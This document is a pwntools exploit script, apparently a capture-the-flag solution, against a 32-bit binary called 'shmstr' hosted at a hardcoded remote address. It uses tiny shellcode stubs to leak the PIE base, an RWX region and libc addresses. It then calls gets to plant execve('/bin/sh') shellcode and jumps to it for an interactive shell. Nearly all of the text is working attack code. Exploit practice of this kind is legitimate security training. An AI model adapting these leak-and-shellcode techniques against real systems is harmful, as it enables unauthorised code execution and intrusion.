from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './shmstr'
HOST = '151.236.114.211'
PORT = 17173

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()


def add(shellcode):
	r.sendlineafter('> ', '1')
	r.sendafter(': ', shellcode)

def view(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ',str(idx))

def delete(idx):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ',str(idx))

def run(idx, arg):
	r.sendlineafter('> ', '4')
	r.sendlineafter(': ',str(idx))
	r.sendlineafter(': ',str(arg))

# leak pie
add(asm('''
pop eax;
push eax;
xor al, 0x30;
xor al, 0x30;
'''))
run(0, 0)

r.recvuntil(' = ')
leak = int(r.recvuntil('\n', True))
pie = leak - 0x1841
dbg('pie')

limit = pie + 0x4010

# extend limit
add(asm('''
pop edx;
pop ecx;
xor [ecx], dh;
push ecx;
push edx;
'''))
run(1, limit)

delete(0)
delete(1)

# leak rwx
add(asm('''
xor al, 0x30;
xor al, 0x30;
xor al, 0x30;
'''))
run(0, 0)
r.recvuntil(' = ')
leak = int(r.recvuntil('\n', True)) & 0xffffffff
rwx = leak - 0x30
dbg('rwx')

delete(0)


# leak libc
out = ''
for i in range(4):
	add(asm('''
	xor dh, [ebx+{}];
	push edx
	pop eax
	inc ecx
	'''.format(0x30+i)))
	run(0, 0)
	r.recvuntil(' = ')
	leak = int(r.recvuntil('\n', True)) & 0xffffffff
	out += chr((leak ^ rwx) >> 8)
	delete(0)

if args.D:
	debug(r, [0x183f])
	#debug(r, [0x14c7])

out = u32(out)
dbg('out')
if args.R:
	base = out - 0x5f810
	gets = base + 0x5e8a0
else:
	# ubuntu16.04
	base = out - 0x60370
	gets = base + 0x5f3f0

dbg('base')

# leak libc
add(asm('''
pop eax;
pop ecx;
push ecx;
push edx;
push eax;
push ecx;
'''))
log.info(str(gets))

# gets(rwx) ftw
# run(0, gets)
r.sendlineafter('> ', '4')
r.sendlineafter(': ','0')

_32_SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
r.sendlineafter(': ',str(gets)+'A'*0x43+_32_SHELLCODE)

delete(0)

# jump to my code
add(asm('''
jno $+0x43
'''))
run(0, 0)

r.interactive()

